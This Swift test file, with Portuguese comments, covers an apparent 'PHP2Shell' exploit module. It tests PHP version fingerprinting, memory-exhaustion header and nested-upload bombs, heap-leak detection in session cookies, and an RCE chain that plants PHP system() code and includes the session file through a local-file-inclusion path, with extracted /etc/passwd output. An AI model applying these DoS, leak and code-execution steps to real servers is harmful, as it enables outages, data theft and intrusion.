import Testing
import Foundation
@testable import PastoralCore

/// PHP2Shell (CVE-2026-109618/109619) — lógica pura: parsing de versão,
/// fingerprint passivo de headers, advisory/classificação, builders
/// multipart (espelho do ikow/php2shell-poc), classificação de sinais,
/// vazamento de memória (PHPSESSID anômalo) e a cadeia A de RCE.
@Suite("Php2Shell (CVE-2026-109618/109619)")
struct Php2ShellTests {

    // MARK: helpers

    private static func raw(status: Int, cookie: String? = nil, body: String = "") -> Data {
        var h = "HTTP/1.1 \(status) X\r\nContent-Length: \(body.utf8.count)\r\n"
        if let c = cookie { h += "Set-Cookie: \(c)\r\n" }
        return Data("\(h)\r\n\(body)".utf8)
    }

    // MARK: version parsing

    @Test("parse major.minor e major.minor.patch")
    func parseVersions() {
        #expect(PhpVersion("8.1") == PhpVersion(major: 8, minor: 1))
        let v = PhpVersion("PHP 7.4.33 (cli)")
        #expect(v?.major == 7 && v?.minor == 4 && v?.patch == 33)
        #expect(PhpVersion("nginx/1.18.0 (php/7.4.33)") != nil)
    }

    @Test("sem número pontilhado não parseia")
    func noDottedNumber() {
        #expect(PhpVersion("nope") == nil)
        #expect(PhpVersion("8") == nil)
    }

    // MARK: fingerprint passivo

    @Test("X-PHP-Version tem prioridade máxima")
    func xPhpVersionWins() {
        let fp = PhpFingerprint(headers: [
            "X-PHP-Version": "8.3.10",
            "Server": "nginx (php/7.1)",
            "X-Powered-By": "PHP/8.0"
        ])
        #expect(fp?.source == "X-PHP-Version")
        #expect(fp?.version.text == "8.3.10")
    }

    @Test("Server conta só se citar php/")
    func serverNeedsPhp() {
        let fp = PhpFingerprint(headers: ["Server": "Apache/2.4.51 (Unix) (php/8.1.26)"])
        #expect(fp?.source == "Server")
        #expect(fp?.version.text == "8.1.26")
        #expect(PhpFingerprint(headers: ["Server": "nginx/1.18.0"]) == nil)
    }

    @Test("X-Powered-By só se começar com PHP (case-insensitive)")
    func poweredByOnlyPhp() {
        #expect(PhpFingerprint(headers: ["X-Powered-By": "PHP/8.0.30"])?.version.text == "8.0.30")
        #expect(PhpFingerprint(headers: ["X-Powered-By": "Express"]) == nil)
        #expect(PhpFingerprint(headers: [:]) == nil)
    }

    // MARK: advisory / classificação

    @Test(arguments: [
        ("8.0.2", true),   // EOL
        ("8.1.31", true),  // EOL, último do ramo
        ("8.2.34", true),  // um patch antes da correção
        ("8.2.35", false), // piso corrigido
        ("8.3.35", true),
        ("8.3.36", false),
        ("8.4.26", true),
        ("8.4.27", false),
        ("8.5.11", true),  // último afetado
        ("8.5.12", false),
        ("5.4.45", true),  // EOL antigo
    ])
    func classifyFloors(_ text: String, _ expectedVulnerable: Bool) {
        #expect(PhpAdvisory.classify(PhpVersion(text)!).isVulnerable == expectedVulnerable)
    }

    @Test("versões fora do escopo do advisory são .unlisted")
    func unlistedVersions() {
        for text in ["9.0.1", "4.4.9"] {
            #expect(PhpAdvisory.classify(PhpVersion(text)!).isVulnerable == false)
        }
        switch PhpAdvisory.classify(PhpVersion("9.0.1")!) {
        case .unlisted: break
        default: Issue.record("9.0.1 deveria ser unlisted")
        }
    }

    // MARK: builders multipart

    @Test("upload-base carrega SID fixado, campo de progress e filename")
    func uploadBase() {
        let b = "BND"
        let data = Php2ShellMultipart.upload(boundary: b, sid: "abc123", filename: "x.php\"y")
        let s = String(data: data, encoding: .utf8)!
        #expect(s.contains("--\(b)\r\n"))
        #expect(s.contains("name=\"PHPSESSID\""))
        #expect(s.contains("\r\nabc123\r\n"))
        #expect(s.contains("PHP_SESSION_UPLOAD_PROGRESS"))
        #expect(s.contains("filename=\"x.php\\\"y\"")) // aspas escapadas
        #expect(s.hasSuffix("--\(b)--\r\n"))
    }

    @Test("header-bomb gera N headers de S bytes")
    func headerBombSize() {
        let data = Php2ShellMultipart.oomHeaderBomb(boundary: "B", headerCount: 4, headerSize: 10, pad: "A")
        let s = String(data: data, encoding: .utf8)!
        for i in 0..<4 {
            #expect(s.contains("X-Pad-\(i): \(String(repeating: "A", count: 10))\r\n"))
        }
    }

    @Test("nested-bomb cria width file-controls aninhados até depth")
    func nestedBombShape() {
        let data = Php2ShellMultipart.oomNestedBomb(boundary: "B", depth: 2, width: 3)
        let s = String(data: data, encoding: .utf8)!
        for i in 0..<3 {
            #expect(s.contains("name=\"f[0][1][\(i)]\""))
            #expect(s.contains("filename=\"\"\r\n"))
        }
    }

    @Test("intensidade escala o gatilho")
    func intensityScales() {
        #expect(PhpOOMIntensity.low.headerBomb.count < PhpOOMIntensity.medium.headerBomb.count)
        #expect(PhpOOMIntensity.medium.headerBomb.count < PhpOOMIntensity.high.headerBomb.count)
        #expect(PhpOOMIntensity.high.nestedBomb.width == 500)
        #expect(PhpOOMIntensity.medium.label == "Média")
    }

    // MARK: classificação de sinais

    @Test("nil → inacessível; vazio → caiu; 5xx → OOM; 200 → normal; lixo → caiu")
    func classifySignals() {
        #expect(Php2ShellProbeLogic.classify(rawResponse: nil) == .unreachable)
        #expect(Php2ShellProbeLogic.classify(rawResponse: Data()) == .crashed)
        #expect(Php2ShellProbeLogic.classify(rawResponse: Self.raw(status: 500)) == .oom(500))
        #expect(Php2ShellProbeLogic.classify(rawResponse: Self.raw(status: 502)) == .oom(502))
        #expect(Php2ShellProbeLogic.classify(rawResponse: Self.raw(status: 200)) == .normal(200))
        #expect(Php2ShellProbeLogic.classify(rawResponse: Data("xyz".utf8)) == .crashed)
    }

    @Test("sinais positivos: crash e OOM; normal e unreachable não contam")
    func positiveSignals() {
        #expect(ProbeSignal.crashed.positive)
        #expect(ProbeSignal.oom(500).positive)
        #expect(!ProbeSignal.normal(200).positive)
        #expect(!ProbeSignal.unreachable.positive)
    }

    // MARK: vazamento de memória (Heartbleed-style)

    @Test("SID normal (≤64) não é vazamento; 120 chars é")
    func disclosureThreshold() {
        let normal = String(repeating: "a", count: 26)
        let big = String(repeating: "b", count: 120)
        let r1 = Self.raw(status: 200, cookie: "PHPSESSID=\(normal)")
        let r2 = Self.raw(status: 200, cookie: "PHPSESSID=\(big); path=/")
        #expect(Php2ShellProbeLogic.sessionIdValue(in: r1)?.count == 26)
        #expect(Php2ShellProbeLogic.disclosureBytes(in: r1) == nil)
        #expect(Php2ShellProbeLogic.disclosureBytes(in: r2) == 120)
    }

    @Test("heap URL-encoded no cookie vem decodificada na amostra")
    func percentDecodedHeap() {
        let raw = Self.raw(status: 200, cookie: "PHPSESSID=AB%41%42")
        #expect(Php2ShellProbeLogic.sessionIdValue(in: raw) == "ABAB")
    }

    @Test("eco do nosso SID prova upload_progress ativo")
    func echoedSession() {
        let raw = Self.raw(status: 200, cookie: "PHPSESSID=mysid42; path=/")
        #expect(Php2ShellProbeLogic.echoedSession(id: raw, sid: "mysid42"))
        #expect(!Php2ShellProbeLogic.echoedSession(id: raw, sid: "other"))
        #expect(!Php2ShellProbeLogic.echoedSession(id: nil, sid: "x"))
    }

    // MARK: cadeia A de RCE

    @Test("plantCode escapa aspas simples no estilo shell")
    func plantCodeEscapes() {
        let code = Php2ShellRCE.plantCode(command: "echo 'oi'")
        #expect(code.contains(#"system('echo '\''oi'\''')"#))
        #expect(code.hasPrefix("<?php echo '\(Php2ShellRCE.startMarker)'"))
    }

    @Test("output extrai entre marcadores e ignora sem marcador")
    func outputBetweenMarkers() {
        let body = "lixo \(Php2ShellRCE.startMarker)root:x:0:0:root:/root\n\(Php2ShellRCE.endMarker) resto"
        #expect(Php2ShellRCE.output(in: body) == "root:x:0:0:root:/root")
        #expect(Php2ShellRCE.output(in: "nada aqui") == nil)
    }

    @Test("lfiPath respeita base terminada em '=' e separador ?/&")
    func lfiPathBuilding() {
        let f = "/tmp/sessions/sess_ab12"
        #expect(Php2ShellRCE.lfiPath(base: "/v.php?page=", sessionFile: f) == "/v.php?page=\(f)")
        #expect(Php2ShellRCE.lfiPath(base: "/v.php", sessionFile: f) == "/v.php?page=\(f)")
        #expect(Php2ShellRCE.lfiPath(base: "/v.php?a=1", sessionFile: f) == "/v.php?a=1&page=\(f)")
    }

    // MARK: relatório / veredito

    @Test("patched diz 'corrigido' mesmo com sinal")
    func patchedSummary() {
        let r = PhpProbeReport(
            host: "h", port: 80, path: "/",
            baseline: .normal(200), oomHeaders: .crashed, oomNested: .normal(0),
            fingerprint: PhpFingerprint(headers: ["X-PHP-Version": "8.2.35"]))
        #expect(r.summary.contains("corrigido"))
        #expect(r.vulnerability!.isVulnerable == false)
    }

    @Test("vulnerável + sinal ativo → VULNERÁVEL; sem sinal → tenta intensidade maior")
    func vulnerableSummary() {
        let hit = PhpProbeReport(
            host: "h", port: 80, path: "/",
            baseline: .normal(200), oomHeaders: .crashed, oomNested: .normal(0),
            fingerprint: PhpFingerprint(headers: ["X-PHP-Version": "7.4.33"]))
        #expect(hit.summary.contains("VULNERÁVEL"))
        #expect(hit.confirmed)

        let miss = PhpProbeReport(
            host: "h", port: 80, path: "/",
            baseline: .normal(200), oomHeaders: .normal(200), oomNested: .normal(200),
            fingerprint: PhpFingerprint(headers: ["X-PHP-Version": "7.4.33"]))
        #expect(!miss.confirmed)
        #expect(miss.summary.contains("intensidade"))
    }

    @Test("inacessível → veredito direto; versão oculta + sinal → VULNERÁVEL por comportamento")
    func blindAndDownSummary() {
        let down = PhpProbeReport(
            host: "h", port: 80, path: "/",
            baseline: .unreachable, oomHeaders: .unreachable, oomNested: .unreachable,
            fingerprint: nil)
        #expect(down.summary.contains("Alvo inacessível"))

        let blind = PhpProbeReport(
            host: "h", port: 80, path: "/",
            baseline: .normal(200), oomHeaders: .normal(200), oomNested: .crashed,
            fingerprint: nil, disclosureBytes: nil)
        #expect(blind.summary.contains("VULNERÁVEL por comportamento"))
    }

    @Test("amostra de vazamento vai no relatório para a Colheita")
    func disclosureSampleInReport() {
        let leaked = String(repeating: "m", count: 120)
        let r = PhpProbeReport(
            host: "h", port: 80, path: "/",
            baseline: .normal(200), oomHeaders: .normal(200), oomNested: .normal(0),
            fingerprint: nil,
            disclosureBytes: 120, disclosureSample: leaked)
        #expect(r.disclosureSample == leaked)
        #expect(r.detailLines.joined().contains("120 chars"))
    }
}
